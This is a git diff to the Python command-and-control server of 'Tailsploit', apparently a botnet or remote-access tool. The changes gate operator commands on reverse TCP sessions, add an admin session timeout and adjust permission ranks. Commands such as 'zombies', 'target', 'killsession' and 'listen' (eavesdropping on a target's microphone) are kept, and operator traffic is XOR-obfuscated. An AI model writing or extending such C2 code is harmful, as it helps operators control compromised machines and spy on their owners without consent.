@@ -46,7 +46,7 @@ PERMISSION_HIERARCHY = {
 }
 
 # Decorator for handling static method commands
-def StaticMethodCommandHandler(command_string, min_rank, is_available=True, exact_match=True):
+def StaticMethodCommandHandler(command_string, min_rank, is_available=True, reverse_shell_flag=None):
     def DecoratorMethod(command_func):
         def StaticWrapper(self, admin_socket, admin_username, handleAdminShellCommands, *args):
             admin_info = self.admins.get(admin_username)
@@ -61,20 +61,21 @@ def StaticMethodCommandHandler(command_string, min_rank, is_available=True, exac
                 return
             
             if is_available:
-                if exact_match:
-                    if handleAdminShellCommands == command_string:
+                if reverse_shell_flag:
+                    if "--FLAG_REVERSE_SHELL_INFO" in handleAdminShellCommands:
                         command_func(self, admin_socket, admin_username, handleAdminShellCommands, *args)
                     else:
-                        invalid_command_response = f"[{Fore.RED}-{Style.RESET_ALL}] Invalid command. Please use '{command_string}' command."
-                        invalid_command_response_xored = self.handleXOREncryption(invalid_command_response.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
-                        admin_socket.send(invalid_command_response_xored)
+                        WarningSession = f"{Fore.YELLOW}[*]{Style.RESET_ALL} You need to be in a reverse TCP Session in order to execute this command."
+                        WarningSessionXOR = self.handleXOREncryption(WarningSession.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                        admin_socket.send(WarningSessionXOR)
                 else:
-                    if handleAdminShellCommands.startswith(command_string):
-                        command_func(self, admin_socket, admin_username, handleAdminShellCommands, *args)
+                    if "--FLAG_REVERSE_SHELL_INFO" in handleAdminShellCommands:
+                        WarningSession = f"{Fore.YELLOW}[*]{Style.RESET_ALL} You need to exit the current reverse TCP Session in order to execute this command."
+                        WarningSessionXOR = self.handleXOREncryption(WarningSession.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                        admin_socket.send(WarningSessionXOR)
                     else:
-                        invalid_command_response = f"[{Fore.RED}-{Style.RESET_ALL}] Invalid command. Please use '{command_string}' command."
-                        invalid_command_response_xored = self.handleXOREncryption(invalid_command_response.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
-                        admin_socket.send(invalid_command_response_xored)
+                        command_func(self, admin_socket, admin_username, handleAdminShellCommands, *args)
+
             else:
                 unavailable_command_response = f"[{Fore.RED}-{Style.RESET_ALL}] '{command_string}' command is not available right now."
                 unavailable_command_response_xored = self.handleXOREncryption(unavailable_command_response.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
@@ -99,6 +100,8 @@ class ServerShell:
         self.UserPermission = ""
         self.clients_lock = threading.Lock()
         self.MAX_ADMINS_CONN = 5
+        self.SET_TIMEOUT = 1800
+        self.TIMEOUT_SESSION = False
 
     def handleXOREncryption(self, content_data, key_traffic):
         key_traffic = key_traffic * (len(content_data) // len(key_traffic)) + key_traffic[:len(content_data) % len(key_traffic)]
@@ -125,7 +128,7 @@ class ServerShell:
         # Token is not whitelisted, return "not valid"
         return "--FLAG_TOKEN_NOT_VALID"
 
-    @StaticMethodCommandHandler("task", is_available=True, exact_match=True, min_rank=1)
+    @StaticMethodCommandHandler("task", is_available=True, min_rank=1, reverse_shell_flag=False)
     def handleViewThreadCommand(self, admin_socket, handleAdminShellCommands, *args):
         thread_info = f"[{Fore.GREEN}*{Style.RESET_ALL}] Tailsploit Running Thread / Job Information(s):\n"
         thread_info += f"[{Fore.GREEN}*{Style.RESET_ALL}] Total Thread(s): {Fore.GREEN}{threading.active_count() - 1}{Style.RESET_ALL}\n\n"        
@@ -156,7 +159,7 @@ class ServerShell:
         process_cpu_percent = process.cpu_percent(interval=0.1)
         return process_cpu_percent
     
-    @StaticMethodCommandHandler("target", is_available=True, exact_match=False, min_rank=2)
+    @StaticMethodCommandHandler("target", is_available=True, min_rank=2, reverse_shell_flag=False)
     def handleTargetCommand(self, admin_socket, admin_username, handleAdminShellCommands, *args):
         if len(args) < 1:
                 InvalidFormat = f"[{Fore.RED}-{Style.RESET_ALL}] Invalid parameters. Please use 'target  <IP>:<PORT>'."
@@ -185,7 +188,7 @@ class ServerShell:
             print("ERRORORORORORO")
             admin_socket.send("An error occured please try again".encode("utf-8"))
 
-    @StaticMethodCommandHandler("listen", is_available=True, exact_match=False, min_rank=2)
+    @StaticMethodCommandHandler("listen", is_available=True, min_rank=2, reverse_shell_flag=True)
     def TailsploitListenTargetMicrophone(self, admin_socket, admin_username, handleAdminShellCommands, *args):
         if "--FLAG_REVERSE_SHELL_INFO" in args[0]:
             target_ip, target_port = args[1].split(":")
@@ -212,7 +215,7 @@ class ServerShell:
             HandleExceptXOR = self.handleXOREncryption(HandleExcept.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
             admin_socket.send(HandleExceptXOR)
 
-    @StaticMethodCommandHandler("map", is_available=True, exact_match=True, min_rank=1)
+    @StaticMethodCommandHandler("map", is_available=True, min_rank=1, reverse_shell_flag=False)
     def TailsploitMapLayers(self, admin_socket, admin_username, handleAdminShellCommands, *args):
         print("[*] Generating tailsploit data map layers...")
         ConnListData = f"--FLAG_TAILSPLOIT_CONN_CLIENT_MAP:{[client_addr[0] for client_addr in self.clients.keys()]}"
@@ -220,7 +223,7 @@ class ServerShell:
         admin_socket.send(ConnListDataXOR)
         print("[*] Done, data has been save in ../../tmp/tailsploit-bot-ipmap-layer-html")
 
-    @StaticMethodCommandHandler("stoplisten", is_available=True, exact_match=False, min_rank=2)
+    @StaticMethodCommandHandler("stoplisten", is_available=True, min_rank=2, reverse_shell_flag=True)
     def TailsploitListenTargetMicrophone(self, admin_socket, admin_username, handleAdminShellCommands, *args):
         if "--FLAG_REVERSE_SHELL_INFO" in args[0]:
             target_ip, target_port = args[1].split(":")
@@ -248,7 +251,7 @@ class ServerShell:
             admin_socket.send(HandleExceptXOR)
     
 
-    @StaticMethodCommandHandler("killsession", is_available=True, exact_match=False, min_rank=2)
+    @StaticMethodCommandHandler("killsession", is_available=True, min_rank=2, reverse_shell_flag=True)
     def TailsploitKillCurrentSessionTCP(self, admin_socket, admin_username, handleAdminShellCommands, *args):
         try:
             if "--FLAG_REVERSE_SHELL_INFO" in args[0]:
@@ -334,7 +337,7 @@ class ServerShell:
                 self.admin_socket = None
                 break
 
-    @StaticMethodCommandHandler("zombies", is_available=True, exact_match=False, min_rank=3)
+    @StaticMethodCommandHandler("zombies", is_available=True, min_rank=1, reverse_shell_flag=False)
     def handleZombiesListCommand(self, admin_socket, *args):
 
         def visible_length(text):
@@ -376,7 +379,7 @@ class ServerShell:
         BotListXOR = self.handleXOREncryption(NewFormatZombies.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
         admin_socket.send(BotListXOR)
 
-    @StaticMethodCommandHandler("ping", exact_match=False, is_available=True, min_rank=1)
+    @StaticMethodCommandHandler("ping", is_available=True, min_rank=2, reverse_shell_flag=True)
     def PingReverseShellTarget(self, admin_socket, admin_username, handleAdminShellCommands, *args):
         if "--FLAG_REVERSE_SHELL_INFO" in args[0]:
             target_ip, target_port = args[1].split(":")
@@ -399,9 +402,9 @@ class ServerShell:
                 admin_socket.send(UserDisconnectedXOR)
                 admin_socket.send("ERRUR".encode())
         else:
-            HandleExcept = f"  : {args[0]}"
-            HandleExceptXOR = self.handleXOREncryption(HandleExcept.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
-            admin_socket.send(HandleExceptXOR)
+            WarningSession = f"{Fore.YELLOW}[*]{Style.RESET_ALL} You need to be in a reverse TCP Session in order to ping the session."
+            WarningSessionXOR = self.handleXOREncryption(WarningSession.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+            admin_socket.send(WarningSessionXOR)
 
     def view_disconnected_clients(self, admin_socket):
         print("\nDisconnected Clients:")
@@ -410,7 +413,7 @@ class ServerShell:
         
         admin_socket.send("DISC".encode('utf-8'))
 
-    @StaticMethodCommandHandler("tokenlist", is_available=True, exact_match=True, min_rank=3)                
+    @StaticMethodCommandHandler("tokenlist", is_available=True, min_rank=3, reverse_shell_flag=False)                
     def handleTokenList(self, admin_socket, *args):
         json_file = "../../lib/authentication/hash-token.json"
 
@@ -451,7 +454,7 @@ class ServerShell:
 
         return "\n".join(formatted_list)
     
-    @StaticMethodCommandHandler("generate-token", is_available=True, exact_match=False, min_rank=3)
+    @StaticMethodCommandHandler("generate-token", is_available=True, min_rank=3, reverse_shell_flag=False)
     def OnGenerateTokenAuth(self, admin_socket, *args):
         TailsploitLocalPermissionHiearchy = ['user', 'admin', 'root']
         if len(args) != 3:
@@ -493,7 +496,7 @@ For more information, see the JSON file located at:
             print(e)
             print("[*] An error occured while generating the token.")
 
-    @StaticMethodCommandHandler("adminlist", is_available=True, exact_match=True, min_rank=1)
+    @StaticMethodCommandHandler("adminlist", is_available=True, min_rank=1, reverse_shell_flag=False)
     def handleAdminListCommand(self, admin_socket, *args):
         admin_list = []
         for username, admin_info in self.admins.items():
@@ -513,7 +516,7 @@ For more information, see the JSON file located at:
         OnlineAdministratorsXOR = self.handleXOREncryption(response.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
         admin_socket.send(OnlineAdministratorsXOR)
 
-    @StaticMethodCommandHandler("session", is_available=True, exact_match=True, min_rank=1)
+    @StaticMethodCommandHandler("session", is_available=True, min_rank=1, reverse_shell_flag=False)
     def handleAdminInfoCommand(self, admin_socket, admin_username, handleAdminShellCommands, *args):
             admin_info = self.admins.get(admin_username)
             if admin_info:
@@ -637,19 +640,23 @@ For more information, see the JSON file located at:
                 if self.TAILSPLOIT_LOG_WEBOOK:
                     TailsploitIncomingConnectionAdminClientAuthorized(client_addr)
 
-                admin_thread = threading.Thread(target=self.handle_admin, args=(client_socket, client_addr, AdminUsername), name=f"Tailsploit Admin Session Handler - @{AdminUsername}")
+                admin_thread = threading.Thread(target=self.handle_admin, args=(client_socket, client_addr, AdminUsername), name=f"Tailsploit Admin Session Data Handler - @{AdminUsername}")
                 admin_thread.start()
+
+                if self.TIMEOUT_SESSION:    
+                    admin_timeout_session_thread = threading.Timer(self.SET_TIMEOUT, self.TailsploitTimeoutSession, args=(client_socket, AdminUsername,))
+                    admin_timeout_session_thread.name = f"Tailsploit Admin Session Timeout Handler - @{AdminUsername}"
+                    admin_timeout_session_thread.start()
             else:
                 pass
     
-    @StaticMethodCommandHandler("latency", is_available=True, exact_match=True, min_rank=1)
+    @StaticMethodCommandHandler("latency", is_available=True, min_rank=1, reverse_shell_flag=False)
     def TailsploitPingServer(self, admin_socket, admin_username, handleAdminShellCommands, *args):
         if len(args) < 0:
             InvalidFormat = f"[{Fore.RED}-{Style.RESET_ALL}] Invalid parameters. Please use 'ping'"
             InvalidFormatXOR = self.handleXOREncryption(InvalidFormat.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
             admin_socket.send(InvalidFormatXOR)
             return
-        time.sleep(0.001)
         end_time = time.time() * 1000  # Record end time in milliseconds
         response_time = end_time - self.TIME_MS
 
@@ -657,7 +664,7 @@ For more information, see the JSON file located at:
         ResponseTailsploitPingXOR = self.handleXOREncryption(ResponseTailsploitPing.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
         admin_socket.send(ResponseTailsploitPingXOR)
 
-    @StaticMethodCommandHandler("kick", is_available=True, exact_match=False, min_rank=3)
+    @StaticMethodCommandHandler("kick", is_available=True, min_rank=3, reverse_shell_flag=False)
     def TailsploitOnKickAdmin(self, admin_socket, admin_username, handleAdminShellCommands, *args):
             if len(args) < 1:
                 InvalidFormat = f"[{Fore.RED}-{Style.RESET_ALL}] Invalid parameters. Please use 'kick  <username>.'"
@@ -680,7 +687,6 @@ For more information, see the JSON file located at:
                 AdminNotFound = f"[{Fore.RED}-{Style.RESET_ALL}] Administrator '{Fore.RED}{args[0]}{Style.RESET_ALL}' not found."
                 AdminNotFoundXOR = self.handleXOREncryption(AdminNotFound.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                 admin_socket.send(AdminNotFoundXOR)
-
 
     def TailsploitTrafficCommunicationData(self):
         while True:
@@ -735,6 +741,11 @@ For more information, see the JSON file located at:
         else:
             SendingDataXOR = self.handleXOREncryption(decoded_data.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
             self.admin_socket.send(SendingDataXOR)
+
+
+    def TailsploitTimeoutSession(self, timeout_admin_socket, timeout_admin_username):
+        print(f"{Fore.RED}[-]{Style.RESET_ALL} Tailsploit Admin Session \x1B[4m{timeout_admin_username}\x1B[0m Timed Out.")
+        timeout_admin_socket.close()
 
     def ConfigurationTailsploitServer(self):
         WebhookPrimaryIndex = None
